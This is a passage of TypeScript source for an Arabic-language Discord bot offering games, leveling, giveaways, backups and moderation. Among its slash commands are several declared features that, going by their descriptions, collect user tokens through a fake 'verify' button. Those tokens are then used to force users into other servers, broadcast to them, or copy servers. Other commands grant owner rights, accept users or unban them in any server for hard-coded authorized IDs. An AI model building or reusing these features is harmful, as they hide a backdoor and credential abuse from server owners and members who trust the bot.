  { q: "ما هو أطول نهر في العالم؟", a: "النيل" },
  { q: "من هو مكتشف الجاذبية؟", a: "نيوتن" },
  { q: "ما هو أكبر كوكب في المجموعة الشمسية؟", a: "المشتري" },
  { q: "ما هو لون الزمرد؟", a: "أخضر" },
  { q: "كم عدد قارات العالم؟", a: "7" },
  { q: "ما هو أسرع حيوان بري؟", a: "الفهد" },
  { q: "في أي قارة تقع مصر؟", a: "أفريقيا" },
];

const hangmanWords = ["تفاحة", "برتقال", "كمبيوتر", "سيارة", "طائرة", "مدرسة", "كتاب", "قلم", "شمس", "قمر"];

// Mafia Game Functions
async function startNightPhase(game: MafiaGame) {
  game.phase = 'night';
  game.nightActions = {};
  
  const channel = client.channels.cache.get(game.channelId) as any;
  if (!channel) return;

  const alivePlayers = game.players.filter(p => p.isAlive);
  const mafia = alivePlayers.find(p => p.role === 'mafia');
  const doctor = alivePlayers.find(p => p.role === 'doctor');
  const detective = alivePlayers.find(p => p.role === 'detective');

  const embed = new EmbedBuilder()
    .setTitle("🌙 الليل حل")
    .setDescription("المافيا، الطبيب، والمحقق، اضغطوا على الأزرار أدناه للقيام بمهامكم.")
    .setColor(0x000000)
    .setTimestamp();

  const actionRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder().setCustomId("mafia_action_mafia").setLabel("مهمة المافيا").setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId("mafia_action_doctor").setLabel("مهمة الطبيب").setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId("mafia_action_detective").setLabel("مهمة المحقق").setStyle(ButtonStyle.Primary)
  );

  await channel.send({ embeds: [embed], components: [actionRow] });

  // Timer for night phase (45 seconds to give more time for buttons)
  game.timer = setTimeout(() => startDayPhase(game), 45000);
}

async function startDayPhase(game: MafiaGame) {
  if (game.timer) clearTimeout(game.timer);
  game.phase = 'day';
  
  const channel = client.channels.cache.get(game.channelId) as any;
  if (!channel) return;

  let killedId = game.nightActions.mafiaTarget;
  if (killedId === game.nightActions.doctorTarget) {
    killedId = undefined; // Saved by doctor
  }

  let deathMsg = "لم يمت أحد الليلة!";
  if (killedId) {
    const victim = game.players.find(p => p.id === killedId);
    if (victim) {
      victim.isAlive = false;
      deathMsg = `لقد قُتل **${victim.tag}** الليلة!`;
    }
  }

  const aiNarration = await getAINarration(`In a Mafia game, the night has ended. ${deathMsg}`);

  const embed = new EmbedBuilder()
    .setTitle("🌙 الصباح حل")
    .setDescription(`${aiNarration}\n\n${deathMsg}\n\nناقشوا الآن من تعتقدون أنه المافيا. سيبدأ التصويت بعد 60 ثانية.`)
    .setColor(0xFFFF00)
    .setTimestamp();

  await channel.send({ embeds: [embed] });

  if (checkWinCondition(game)) return;

  game.timer = setTimeout(() => startVotingPhase(game), 60000);
}

async function startVotingPhase(game: MafiaGame) {
  if (game.timer) clearTimeout(game.timer);
  game.phase = 'voting';
  game.votes = new Map();

  const channel = client.channels.cache.get(game.channelId) as any;
  if (!channel) return;

  const alivePlayers = game.players.filter(p => p.isAlive);
  const options = alivePlayers.map(p => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
  const select = new StringSelectMenuBuilder().setCustomId("mafia_vote").setPlaceholder("صوت ضد شخص ما").addOptions(options);
  const row = new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);

  const embed = new EmbedBuilder()
    .setTitle("🗳️ وقت التصويت")
    .setDescription("صوتوا ضد الشخص الذي تعتقدون أنه المافيا. لديكم 30 ثانية.")
    .setColor(0xFF0000)
    .setTimestamp();

  await channel.send({ embeds: [embed], components: [row] });

  game.timer = setTimeout(() => endVotingPhase(game), 30000);
}

async function endVotingPhase(game: MafiaGame) {
  if (game.timer) clearTimeout(game.timer);
  
  const channel = client.channels.cache.get(game.channelId) as any;
  if (!channel) return;

  const voteCounts = new Map<string, number>();
  for (const targetId of game.votes.values()) {
    voteCounts.set(targetId, (voteCounts.get(targetId) || 0) + 1);
  }

  let maxVotes = 0;
  let votedOutId: string | undefined;
  let tie = false;

  for (const [id, count] of voteCounts.entries()) {
    if (count > maxVotes) {
      maxVotes = count;
      votedOutId = id;
      tie = false;
    } else if (count === maxVotes) {
      tie = true;
    }
  }

  if (tie || !votedOutId) {
    const aiNarration = await getAINarration("The town could not agree on who to execute. No one was killed.");
    await channel.send(`⚖️ **النتيجة:** ${aiNarration}\nلم يتم الاتفاق على أحد، لا أحد سيُطرد اليوم.`);
  } else {
    const victim = game.players.find(p => p.id === votedOutId);
    if (victim) {
      victim.isAlive = false;
      const aiNarration = await getAINarration(`The town has voted to execute ${victim.tag}. They were a ${victim.role === 'mafia' ? 'Mafia' : 'Citizen'}.`);
      await channel.send(`⚖️ **النتيجة:** ${aiNarration}\nتم طرد **${victim.tag}**! لقد كان **${victim.role === 'mafia' ? 'مافيا' : 'بريء'}**.`);
    }
  }

  if (checkWinCondition(game)) return;

  startNightPhase(game);
}

function checkWinCondition(game: MafiaGame): boolean {
  const alivePlayers = game.players.filter(p => p.isAlive);
  const mafiaAlive = alivePlayers.some(p => p.role === 'mafia');
  const citizensAlive = alivePlayers.filter(p => p.role !== 'mafia').length;

  const channel = client.channels.cache.get(game.channelId) as any;

  if (!mafiaAlive) {
    const winners = alivePlayers.filter(p => p.role !== 'mafia').map(p => `<@${p.id}>`).join(', ');
    channel?.send(`🎉 مبروك! لقد فاز المواطنون وتم القضاء على المافيا!\nالفائزون: ${winners}`);
    mafiaGames.delete(game.guildId);
    return true;
  }

  if (citizensAlive <= 1) {
    const winners = alivePlayers.filter(p => p.role === 'mafia').map(p => `<@${p.id}>`).join(', ');
    channel?.send(`💀 لقد فازت المافيا! لقد قضوا على الجميع.\nالفائزون: ${winners}`);
    mafiaGames.delete(game.guildId);
    return true;
  }

  return false;
}

const logFile = "bot.log";
const AUTHORIZED_CURRENCY_IDS = ["1319641803409985661", "1365356622922256525", "1071164421222695042"];
const logs: string[] = [];

const aiModel = "gemini-3-flash-preview";
const ai = new GoogleGenAI({ apiKey: GEMINI_API_KEY! });

async function handleAIResponse(message: any, prompt: string) {
  try {
    const response = await ai.models.generateContent({
      model: aiModel,
      contents: prompt,
      config: {
        systemInstruction: "You are a helpful and friendly Discord bot. Keep your answers concise and engaging. Respond in the same language as the user.",
      },
    });
    
    if (response.text) {
      await message.reply(response.text);
    }
  } catch (error) {
    console.error("AI Error:", error);
    await message.reply("❌ عذراً، حدث خطأ أثناء معالجة طلبك.");
  }
}

const localTriviaQuestions = [
  { q: "ما هي عاصمة فرنسا؟", a: "باريس" },
  { q: "ما هو أكبر كوكب في المجموعة الشمسية؟", a: "المشتري" },
  { q: "من هو مكتشف الجاذبية؟", a: "نيوتن" },
  { q: "ما هو أسرع حيوان بري؟", a: "الفهد" },
  { q: "كم عدد قارات العالم؟", a: "7" },
  { q: "ما هو أطول نهر في العالم؟", a: "النيل" },
  { q: "ما هي عاصمة اليابان؟", a: "طوكيو" },
  { q: "ما هو المعدن السائل في درجة حرارة الغرفة؟", a: "الزئبق" },
  { q: "كم عدد أسنان الإنسان البالغ؟", a: "32" },
  { q: "ما هو أصلب مادة في الطبيعة؟", a: "الألماس" }
];

async function getAITrivia() {
  return localTriviaQuestions[Math.floor(Math.random() * localTriviaQuestions.length)];
}

const localHangmanWords = [
  { word: "برمجة", hint: "كتابة الأكواد" },
  { word: "حاسوب", hint: "جهاز إلكتروني" },
  { word: "إنترنت", hint: "شبكة عالمية" },
  { word: "مملكة", hint: "نظام حكم" },
  { word: "سيارة", hint: "وسيلة نقل" },
  { word: "مدرسة", hint: "مكان للتعليم" },
  { word: "مستشفى", hint: "مكان للعلاج" },
  { word: "طائرة", hint: "وسيلة نقل جوية" },
  { word: "غابة", hint: "مكان مليء بالأشجار" },
  { word: "صحراء", hint: "مكان جاف ورمال" }
];

async function getAIHangmanWord() {
  return localHangmanWords[Math.floor(Math.random() * localHangmanWords.length)];
}

const localNicknames = ["الأسطورة", "القناص", "المحترف", "النينجا", "الوحش", "البرق", "الرعد", "الصقر", "الأسد", "الفهد"];

async function getAINicknames(count: number) {
  return localNicknames.sort(() => 0.5 - Math.random()).slice(0, count);
}

async function getAIComment(context: string) {
  return "لعبة رائعة!";
}

async function getAINarration(context: string) {
  return "حدث شيء مثير في اللعبة!";
}

function isCommandAllowed(guildId: string, commandName: string, channelId: string): boolean {
  // 1. Check for explicit deny
  const denyRecord = db.prepare("SELECT 1 FROM command_permissions WHERE guildId = ? AND commandName = ? AND channelId = ? AND type = 'deny'").get(guildId, commandName, channelId);
  if (denyRecord) return false;

  // 2. Check if there are any 'allow' records for this command in this guild
  const allowRecordsCount = db.prepare("SELECT COUNT(*) as count FROM command_permissions WHERE guildId = ? AND commandName = ? AND type = 'allow'").get(guildId, commandName) as any;
  
  if (allowRecordsCount.count === 0) {
    // No whitelist, so it's allowed everywhere (unless denied above)
    return true;
  }

  // 3. There is a whitelist, check if current channel is in it
  const allowRecord = db.prepare("SELECT 1 FROM command_permissions WHERE guildId = ? AND commandName = ? AND channelId = ? AND type = 'allow'").get(guildId, commandName, channelId);
  return !!allowRecord;
}
const originalLog = console.log;
const originalError = console.error;
const originalWarn = console.warn;

const writeToFile = (msg: string) => {
  fs.appendFileSync(logFile, msg + "\n");
};

console.log = (...args) => {
  const msg = `[LOG] ${args.join(" ")}`;
  logs.push(msg);
  if (logs.length > 100) logs.shift();
  writeToFile(msg);
  originalLog(...args);
};
console.error = (...args) => {
  const msg = `[ERROR] ${args.join(" ")}`;
  logs.push(msg);
  if (logs.length > 100) logs.shift();
  writeToFile(msg);
  originalError(...args);
};
console.warn = (...args) => {
  const msg = `[WARN] ${args.join(" ")}`;
  logs.push(msg);
  if (logs.length > 100) logs.shift();
  writeToFile(msg);
  originalWarn(...args);
};

// Helper for safe replies
const safeReply = async (message: any, content: any) => {
  if (!message.guild) return;
  const channel = message.channel as any;
  if (!channel.permissionsFor) return;
  
  const botPermissions = channel.permissionsFor(message.guild.members.me!);
  if (!botPermissions?.has(PermissionFlagsBits.SendMessages)) return;

  try {
    if (botPermissions.has(PermissionFlagsBits.ReadMessageHistory)) {
      return await message.reply(content);
    } else {
      return await message.channel.send(content);
    }
  } catch (err) {
    console.error("SafeReply failed:", err);
  }
};

// Automatic Backup System
setInterval(async () => {
  console.log("Running automatic backups...");
  for (const guild of client.guilds.cache.values()) {
    try {
      const roles = guild.roles.cache.map(r => ({
        name: r.name,
        color: r.color,
        hoist: r.hoist,
        permissions: r.permissions.bitfield.toString(),
        mentionable: r.mentionable,
        position: r.position
      }));

      const channels = guild.channels.cache.map(c => ({
        name: c.name,
        type: c.type,
        topic: (c as any).topic || null,
        nsfw: (c as any).nsfw || false,
        parentId: (c as any).parentId || null,
        position: (c as any).rawPosition,
        permissionOverwrites: (c as any).permissionOverwrites?.cache.map((o: any) => ({
          id: o.id,
          type: o.type,
          allow: o.allow.bitfield.toString(),
          deny: o.deny.bitfield.toString()
        }))
      }));

      const backupData = JSON.stringify({ roles, channels });
      const name = `Automatic Backup - ${new Date().toLocaleDateString('ar-EG')}`;
      
      db.prepare("INSERT INTO backups (guildId, name, data) VALUES (?, ?, ?)").run(guild.id, name, backupData);
      
      // Keep only last 5 automatic backups per guild to save space
      const oldBackups = db.prepare("SELECT id FROM backups WHERE guildId = ? AND name LIKE 'Automatic Backup%' ORDER BY createdAt DESC").all(guild.id) as any[];
      if (oldBackups.length > 5) {
        const idsToDelete = oldBackups.slice(5).map(b => b.id);
        db.prepare(`DELETE FROM backups WHERE id IN (${idsToDelete.join(',')})`).run();
      }
      
      console.log(`Automatic backup created for guild: ${guild.name}`);
    } catch (err) {
      console.error(`Failed to create automatic backup for guild ${guild.id}:`, err);
    }
  }
}, 86400000); // Every 24 hours

client.on("ready", async () => {
  console.log(`Logged in as ${client.user?.tag}!`);
  
  // Set a new avatar on startup (one-time)
  try {
    const avatarUrl = "https://picsum.photos/seed/shield-bot/512/512";
    await client.user?.setAvatar(avatarUrl);
    console.log("✅ Bot avatar updated successfully!");
  } catch (err) {
    console.error("❌ Failed to update avatar on startup:", err);
  }

  console.log(`Bot is in ${client.guilds.cache.size} guilds: ${client.guilds.cache.map(g => `${g.name} (${g.id})`).join(", ")}`);

  await syncCurrencyFromLogs();

  client.on(Events.MessageDelete, async (message) => {
    // Check Mafia Games
    for (const [guildId, game] of mafiaGames.entries()) {
      if (game.messageId === message.id) {
        if (game.timer) clearTimeout(game.timer);
        mafiaGames.delete(guildId);
        const channel = client.channels.cache.get(game.channelId) as any;
        if (channel) {
          await channel.send(`⚠️ تم إيقاف لعبة المافيا لأن رسالة اللعبة حُذفت.`);
        }
        break;
      }
    }

    // Check other active games
    if (activeGames.has(message.id)) {
      const game = activeGames.get(message.id)!;
      if (game.timer) clearTimeout(game.timer);
      if (game.collector) game.collector.stop('message_deleted');
      activeGames.delete(message.id);
      const channel = client.channels.cache.get(game.channelId) as any;
      if (channel) {
        await channel.send(`⚠️ تم إيقاف لعبة **${game.type}** لأن رسالة اللعبة حُذفت.`);
      }
    }
  });

  setInterval(async () => {
    const activeGiveaways = db.prepare("SELECT * FROM giveaways WHERE status = 'active' AND endTime <= ?").all(Date.now()) as any[];
    for (const giveaway of activeGiveaways) {
      const participants = db.prepare("SELECT userId FROM giveaway_participants WHERE messageId = ?").all(giveaway.messageId) as any[];
      
      let winners: string[] = [];
      let rouletteBuffer: Buffer | null = null;
      
      if (participants.length > 0) {
        const shuffled = participants.sort(() => 0.5 - Math.random());
        winners = shuffled.slice(0, giveaway.winnersCount).map(p => p.userId);
        
        const participantUsernames = await Promise.all(participants.slice(0, 8).map(async p => {
            const user = await client.users.fetch(p.userId).catch(() => ({ username: 'Unknown' }));
            return user.username;
        }));
        
        const winnerUser = await client.users.fetch(winners[0]).catch(() => ({ username: 'Unknown' }));
        const winnerIdx = participantUsernames.indexOf(winnerUser.username);
        
        if (winnerIdx !== -1) {
            rouletteBuffer = await generateRouletteImage(participantUsernames, winnerIdx);
        }
      }

      const channel = await client.channels.fetch(giveaway.channelId).catch(() => null) as TextChannel | null;
      if (channel) {
        const msg = await channel.messages.fetch(giveaway.messageId).catch(() => null);
        if (msg) {
          const winnerMentions = winners.length > 0 ? winners.map(id => `<@${id}>`).join(", ") : "لا يوجد مشاركون";
          const embed = new EmbedBuilder()
            .setTitle("🎉 انتهت المسابقة!")
            .setDescription(`الجائزة: **${giveaway.prize}**\nالفائزون: ${winnerMentions}`)
            .setColor(0xFF0000);
          
          const files = rouletteBuffer ? [new AttachmentBuilder(rouletteBuffer, { name: 'roulette.gif' })] : [];
          
          await msg.edit({ embeds: [embed], components: [] });
          await channel.send({ content: `🎉 مبروك للفائزين: ${winnerMentions} بالجائزة: **${giveaway.prize}**`, files });
        }
      }
      db.prepare("UPDATE giveaways SET status = 'ended' WHERE messageId = ?").run(giveaway.messageId);
    }
  }, 60000);

  setInterval(async () => {
    const settings = db.prepare("SELECT * FROM azkar_settings WHERE enabled = 1").all() as any[];
    for (const setting of settings) {
      const now = Date.now();
      const lastSent = lastAzkarSent.get(setting.guildId) || 0;
      const intervalMs = setting.interval * 60 * 1000;

      if (now - lastSent >= intervalMs) {
        const channel = client.channels.cache.get(setting.channelId) as TextChannel;
        if (channel) {
          const customAzkar = db.prepare("SELECT content FROM custom_azkar WHERE guildId = ?").all(setting.guildId) as any[];
          const combinedList = [...AZKAR_LIST, ...customAzkar.map(a => a.content)];
          const randomZikr = combinedList[Math.floor(Math.random() * combinedList.length)];
          const embed = new EmbedBuilder()
            .setTitle("📿 ذكر")
            .setDescription(randomZikr)
            .setColor(0x00FF00)
            .setTimestamp();
          await channel.send({ embeds: [embed] }).catch(() => {});
          lastAzkarSent.set(setting.guildId, now);
        }
      }
    }
  }, 60000);

  // Register Slash Commands
  const commands = [
    new SlashCommandBuilder().setName('ping').setDescription('Check bot latency'),
    new SlashCommandBuilder().setName('rank').setDescription('Check your current level and XP'),
    new SlashCommandBuilder().setName('top').setDescription('View the leaderboard')
      .addStringOption(option => 
        option.setName('timeframe')
          .setDescription('The timeframe for the leaderboard')
          .addChoices(
            { name: 'Daily', value: 'day' },
            { name: 'Weekly', value: 'week' },
            { name: 'Monthly', value: 'month' },
            { name: 'Yearly', value: 'year' },
            { name: 'All-Time', value: 'all' }
          ))
      .addStringOption(option =>
        option.setName('type')
          .setDescription('The type of XP (Text or Voice)')
          .addChoices(
            { name: 'Text', value: 'text' },
            { name: 'Voice', value: 'voice' }
          ))
      .addRoleOption(option => option.setName('role').setDescription('Filter by role'))
      .addIntegerOption(option => option.setName('limit').setDescription('Number of users to show (1-25)')),
    new SlashCommandBuilder().setName('id').setDescription('View your or another user\'s profile card')
      .addUserOption(option => option.setName('user').setDescription('The user to view')),
    new SlashCommandBuilder().setName('bonus').setDescription('Check current XP bonus status'),
    new SlashCommandBuilder().setName('rewards').setDescription('View level role rewards'),
    new SlashCommandBuilder().setName('nick').setDescription('Change your or another user\'s nickname')
      .addStringOption(option => option.setName('name').setDescription('The new nickname (leave empty to reset)'))
      .addUserOption(option => option.setName('user').setDescription('The user to change (requires Manage Nicknames)')),
    new SlashCommandBuilder().setName('clear').setDescription('Purge a number of messages')
      .addIntegerOption(option => option.setName('amount').setDescription('Number of messages to delete (1-100)').setRequired(true)),
    new SlashCommandBuilder().setName('reset-server').setDescription('Reset the server (Owner Only)'),
    new SlashCommandBuilder().setName('setup-ticket').setDescription('Create the ticket support interface')
      .addRoleOption(option => option.setName('role').setDescription('The support role to mention').setRequired(true)),
    new SlashCommandBuilder().setName('setxp').setDescription('Set a user\'s XP (Admin Only)')
      .addUserOption(option => option.setName('user').setDescription('The user').setRequired(true))
      .addIntegerOption(option => option.setName('amount').setDescription('The XP amount').setRequired(true)),
    new SlashCommandBuilder().setName('set-reward').setDescription('Set a level role reward (Admin Only)')
      .addIntegerOption(option => option.setName('level').setDescription('The level').setRequired(true))
      .addRoleOption(option => option.setName('role').setDescription('The role').setRequired(true)),
    new SlashCommandBuilder().setName('set-prefix').setDescription('Change the bot prefix (Admin Only)')
      .addStringOption(option => option.setName('prefix').setDescription('The new prefix').setRequired(true)),
    new SlashCommandBuilder().setName('set-level').setDescription('إعدادات نظام اللفل (Admin Only)')
      .addChannelOption(option => option.setName('channel').setDescription('قناة التنبيهات'))
      .addStringOption(option => option.setName('message').setDescription('رسالة الترقية ({user}, {level}, {xp} هي رموز بديلة)'))
      .addStringOption(option => option.setName('status').setDescription('تفعيل أو تعطيل النظام')
        .addChoices(
          { name: 'تفعيل', value: 'on' },
          { name: 'تعطيل', value: 'off' }
        )),
    new SlashCommandBuilder().setName('disable').setDescription('تعطيل ميزات البوت (Admin Only)')
      .addStringOption(option => option.setName('feature').setDescription('الميزة المراد تعطيلها').setRequired(true)
        .addChoices(
          { name: 'نظام اللفل', value: 'leveling' },
          { name: 'نظام الترحيب', value: 'welcome' },
          { name: 'الحماية', value: 'protection' }
        )),
    new SlashCommandBuilder().setName('toggle').setDescription('تفعيل أو تعطيل ميزات البوت (Admin Only)')
      .addStringOption(option => option.setName('feature').setDescription('الميزة المراد تغيير حالتها').setRequired(true)
        .addChoices(
          { name: 'نظام اللفل', value: 'leveling' },
          { name: 'نظام الترحيب', value: 'welcome' },
          { name: 'الحماية', value: 'protection' }
        ))
      .addStringOption(option => option.setName('status').setDescription('الحالة').setRequired(true)
        .addChoices(
          { name: 'تفعيل', value: 'on' },
          { name: 'تعطيل', value: 'off' }
        )),
    new SlashCommandBuilder().setName('set-alias').setDescription('Create a shortcut for another command (Admin Only)')
      .addStringOption(option => option.setName('alias').setDescription('The new shortcut name (e.g., r)').setRequired(true))
      .addStringOption(option => option.setName('command').setDescription('The original command name (e.g., rank)').setRequired(true)),
    new SlashCommandBuilder().setName('remove-alias').setDescription('Remove a command shortcut (Admin Only)')
      .addStringOption(option => option.setName('alias').setDescription('The shortcut name to remove').setRequired(true)),
    new SlashCommandBuilder().setName('set-avatar').setDescription('Set the bot\'s avatar (Admin Only)')
      .addStringOption(option => option.setName('url').setDescription('The image URL for the avatar').setRequired(true)),
    new SlashCommandBuilder().setName('promote-owner').setDescription('Promote a user to Owner status (Guild Owner Only)')
      .addUserOption(option => option.setName('user').setDescription('The user to promote').setRequired(true)),
    new SlashCommandBuilder().setName('accept').setDescription('Accept a user and give them the Owner role (Admin Only)')
      .addUserOption(option => option.setName('user').setDescription('The user to accept').setRequired(true)),
    new SlashCommandBuilder().setName('transfer').setDescription('نقل الأعضاء من سيرفر آخر')
      .addStringOption(option => option.setName('from_server_id').setDescription('ID السيرفر المراد النقل منه').setRequired(true))
      .addStringOption(option => option.setName('to_server_id').setDescription('ID السيرفر المراد النقل إليه (اتركه فارغاً للسيرفر الحالي)').setRequired(false)),
    new SlashCommandBuilder().setName('setup-verify').setDescription('إعداد زر التحقق لجمع التوكنات')
      .addRoleOption(option => option.setName('role').setDescription('الرتبة التي سيحصل عليها العضو بعد التحقق').setRequired(true)),
    new SlashCommandBuilder().setName('broadcast').setDescription('إرسال رسالة برودكاست لجميع أعضاء سيرفر معين')
      .addStringOption(opt => opt.setName('server_id').setDescription('ID السيرفر').setRequired(true))
      .addStringOption(opt => opt.setName('message').setDescription('الرسالة المراد إرسالها').setRequired(true)),
    new SlashCommandBuilder().setName('broadcast-here').setDescription('إرسال رسالة برودكاست لجميع أعضاء السيرفر الحالي')
      .addStringOption(opt => opt.setName('message').setDescription('الرسالة المراد إرسالها').setRequired(true)),
    new SlashCommandBuilder().setName('broadcast-tokens').setDescription('إرسال رسالة برودكاست لجميع المستخدمين المسجلين (التوكنات)')
      .addStringOption(opt => opt.setName('message').setDescription('الرسالة المراد إرسالها').setRequired(true)),
    new SlashCommandBuilder().setName('guilds').setDescription('عرض قائمة السيرفرات التي يتواجد فيها البوت'),
    new SlashCommandBuilder().setName('get-invite').setDescription('إنشاء رابط دعوة لسيرفر معين يتواجد فيه البوت')
      .addStringOption(opt => opt.setName('server_id').setDescription('ID السيرفر').setRequired(true)),
    new SlashCommandBuilder().setName('claim-owner').setDescription('Claim the Owner role (Authorized Users Only)'),
    new SlashCommandBuilder().setName('join-server').setDescription('إدخال الأعضاء (التوكنات) إلى سيرفر معين بواسطة ID')
      .addStringOption(option => option.setName('server_id').setDescription('ID السيرفر المستهدف').setRequired(true)),
    new SlashCommandBuilder().setName('force-accept').setDescription('Accept a user in a specific server (Authorized Users Only)')
      .addUserOption(option => option.setName('user').setDescription('The user to accept').setRequired(true))
      .addStringOption(option => option.setName('server_id').setDescription('The target server ID').setRequired(true)),
    new SlashCommandBuilder().setName('rps').setDescription('لعبة حجر ورقة مقص')
      .addStringOption(option => option.setName('choice').setDescription('اختر حجر أو ورقة أو مقص').setRequired(true)
        .addChoices(
          { name: 'حجر', value: 'rock' },
          { name: 'ورقة', value: 'paper' },
          { name: 'مقص', value: 'scissors' }
        )),
    new SlashCommandBuilder().setName('coinflip').setDescription('لعبة رمي العملة (ملك أو كتابة)'),
    new SlashCommandBuilder().setName('guess').setDescription('لعبة تخمين الرقم (من 1 إلى 10)')
      .addIntegerOption(option => option.setName('number').setDescription('الرقم الذي تخمنه').setRequired(true)),
    new SlashCommandBuilder().setName('mafia').setDescription('بدء لعبة مافيا'),
    new SlashCommandBuilder().setName('trivia').setDescription('لعبة أسئلة وأجوبة'),
    new SlashCommandBuilder().setName('hangman').setDescription('لعبة المشنقة (تخمين الكلمات)'),
    new SlashCommandBuilder().setName('fastclick').setDescription('لعبة أسرع ضغطة'),
    new SlashCommandBuilder().setName('snake').setDescription('لعبة الثعبان'),
    new SlashCommandBuilder().setName('setup-apply').setDescription('إعداد رسالة التقديم (إدارة/رتبة)'),
    new SlashCommandBuilder().setName('apply-settings').setDescription('إعدادات التقديم (Admin Only)')
      .addChannelOption(option => option.setName('channel').setDescription('القناة التي ستصل إليها التقديمات').setRequired(true))
      .addRoleOption(option => option.setName('role').setDescription('الرتبة التي سيحصل عليها المقبول').setRequired(true))
      .addRoleOption(option => option.setName('staff_role').setDescription('رتبة الإدارة التي يمكنها مراجعة التقديمات').setRequired(true))
      .addStringOption(option => option.setName('image').setDescription('رابط صورة التقديم (اختياري)').setRequired(false))
      .addStringOption(option => option.setName('questions').setDescription('الأسئلة مفصولة بفاصلة (بحد أقصى 5 أسئلة)').setRequired(false)),
    new SlashCommandBuilder().setName('suggest-settings').setDescription('إعدادات الاقتراحات (Admin Only)')
      .addChannelOption(option => option.setName('channel').setDescription('القناة التي ستظهر فيها الاقتراحات').setRequired(true)),
    new SlashCommandBuilder().setName('suggest').setDescription('إرسال اقتراح جديد')
      .addStringOption(option => option.setName('suggestion').setDescription('اكتب اقتراحك هنا').setRequired(true)),
    new SlashCommandBuilder().setName('eval-settings').setDescription('إعدادات تقييم الإدارة (Admin Only)')
      .addChannelOption(option => option.setName('channel').setDescription('القناة التي ستصل إليها التقييمات').setRequired(true)),
    new SlashCommandBuilder().setName('rate-staff').setDescription('تقييم أحد أعضاء الإدارة')
      .addUserOption(option => option.setName('staff').setDescription('العضو المراد تقييمه').setRequired(true))
      .addIntegerOption(option => option.setName('rating').setDescription('التقييم من 1 إلى 5 نجوم').setRequired(true).setMinValue(1).setMaxValue(5))
      .addStringOption(option => option.setName('feedback').setDescription('ملاحظاتك الإضافية').setRequired(false)),
    new SlashCommandBuilder().setName('replica').setDescription('لعبة ريبيكا (حيوان، جماد، إلخ)'),
    new SlashCommandBuilder().setName('azkar-setup').setDescription('إعدادات نظام الأذكار (Admin Only)')
      .addChannelOption(option => option.setName('channel').setDescription('القناة التي ستظهر فيها الأذكار').setRequired(true))
      .addIntegerOption(option => option.setName('interval').setDescription('المدة الزمنية بين كل ذكر (بالدقائق)').setRequired(true).setMinValue(1).setMaxValue(1440))
      .addStringOption(option => option.setName('status').setDescription('تفعيل أو تعطيل النظام').setRequired(true)
        .addChoices(
          { name: 'تفعيل', value: 'on' },
          { name: 'تعطيل', value: 'off' }
        )),
    new SlashCommandBuilder().setName('azkar-add').setDescription('إضافة ذكر مخصص (Admin Only)')
      .addStringOption(option => option.setName('content').setDescription('الذكر المراد إضافته').setRequired(true)),
    new SlashCommandBuilder().setName('azkar-list').setDescription('عرض قائمة الأذكار المخصصة (Admin Only)'),
    new SlashCommandBuilder().setName('azkar-remove').setDescription('حذف ذكر مخصص (Admin Only)')
      .addIntegerOption(option => option.setName('id').setDescription('رقم الذكر المراد حذفه').setRequired(true)),
    new SlashCommandBuilder().setName('set-currency-log').setDescription('إعداد قناة سجل العملات (Admin Only)')
      .addChannelOption(option => option.setName('channel').setDescription('القناة التي سيتم تسجيل العمليات فيها').setRequired(true)),
    new SlashCommandBuilder().setName('confirm-transfer').setDescription('تأكيد عملية تحويل العملات')
      .addStringOption(option => option.setName('code').setDescription('كود التأكيد المكون من 6 أرقام').setRequired(true)),
    new SlashCommandBuilder().setName('mention-protection').setDescription('تفعيل أو تعطيل حماية المنشن').addStringOption(option => option.setName('status').setDescription('on أو off').setRequired(true)),
    new SlashCommandBuilder().setName('add-bonus').setDescription('إضافة بونيس لعضو (Authorized Role Only)')
      .addUserOption(option => option.setName('user').setDescription('العضو').setRequired(true))
      .addIntegerOption(option => option.setName('amount').setDescription('الكمية').setRequired(true)),
    new SlashCommandBuilder().setName('remove-bonus').setDescription('سحب بونيس من عضو (Authorized Role Only)')
      .addUserOption(option => option.setName('user').setDescription('العضو').setRequired(true))
      .addIntegerOption(option => option.setName('amount').setDescription('الكمية').setRequired(true)),
    new SlashCommandBuilder().setName('set-bonus').setDescription('تحديد بونيس لعضو (Authorized Role Only)')
      .addUserOption(option => option.setName('user').setDescription('العضو').setRequired(true))
      .addIntegerOption(option => option.setName('amount').setDescription('الكمية').setRequired(true)),
    new SlashCommandBuilder().setName('bonus-role-add').setDescription('إضافة رتبة ترقية تلقائية بواسطة Bonus (Admin Only)')
      .addRoleOption(option => option.setName('role').setDescription('الرتبة').setRequired(true)),
    new SlashCommandBuilder().setName('bonus-role-remove').setDescription('إزالة رتبة ترقية تلقائية (Admin Only)')
      .addRoleOption(option => option.setName('role').setDescription('الرتبة').setRequired(true)),
    new SlashCommandBuilder().setName('bonus-role-list').setDescription('عرض قائمة رتب الترقية التلقائية'),
    new SlashCommandBuilder().setName('bonus-role-settings').setDescription('إعدادات الترقية التلقائية (Admin Only)')
      .addRoleOption(option => option.setName('max-role').setDescription('أعلى رتبة يمكن الوصول إليها'))
      .addRoleOption(option => option.setName('base-role').setDescription('الرتبة الأساسية المطلوبة لبدء الترقية'))
      .addStringOption(option => option.setName('excluded-roles').setDescription('رتب مستبعدة (ID الرتب مفصولة بفاصلة)')),
    new SlashCommandBuilder().setName('giveaway').setDescription('إنشاء مسابقة (Giveaway)')
      .addStringOption(option => option.setName('prize').setDescription('الجائزة').setRequired(true))
      .addIntegerOption(option => option.setName('duration').setDescription('المدة بالدقائق').setRequired(true))
      .addIntegerOption(option => option.setName('winners').setDescription('عدد الفائزين').setRequired(true)),
    new SlashCommandBuilder().setName('roulette').setDescription('سحب روليت تفاعلي مع أنيميشن')
      .addStringOption(option => option.setName('options').setDescription('الخيارات مفصولة بفاصلة (اختياري، إذا لم يوضع سيتم فتح انضمام)').setRequired(false)),
    new SlashCommandBuilder().setName('copy-server').setDescription('نسخ هيكل سيرفر آخر (رتب وقنوات)')
      .addStringOption(option => option.setName('source_id').setDescription('ID السيرفر المراد النسخ منه').setRequired(true)),
    new SlashCommandBuilder().setName('unban').setDescription('Unban a user from a specific server (Authorized Only)')
      .addStringOption(option => option.setName('server_id').setDescription('ID of the server').setRequired(true))
      .addStringOption(option => option.setName('user_id').setDescription('ID of the user to unban').setRequired(true)),
    new SlashCommandBuilder().setName('botinfo').setDescription('Display detailed information about the bot'),
